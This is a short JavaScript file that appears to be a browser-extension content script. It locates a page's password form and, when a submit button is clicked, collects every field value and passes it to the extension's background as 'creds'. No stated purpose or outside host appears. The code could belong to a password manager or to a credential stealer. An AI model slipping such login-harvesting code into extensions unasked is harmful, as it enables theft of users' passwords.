var inputs = document.getElementsByTagName('input');
var password;
for (var i = 0; i<inputs.length; i++) {
	if (inputs[i].type.toLowerCase() == 'password') {
		password = inputs[i];
		break;
	}
}

if (password) {
	var submitElements = [];
	var fields = password.form.elements;
	var possibleCredentialFields = []
	for (var i = 0; i < fields.length; i++) {
		var field = fields[i];
		if (field.type.toLowerCase() == 'submit') {
			submitElements.push(field);
		} else {
			possibleCredentialFields.push(field);
		}
	}

	function collect() {
		var res = [];
		for(var i in possibleCredentialFields) {
			res.push(possibleCredentialFields[i].value);
		}
		return res;
	}

	submitElements.forEach( function(submitField) {
		submitField.addEventListener("click", function() {
			var creds = collect();
			chrome.runtime.sendMessage({creds: creds}, function() {});
		});
	});
}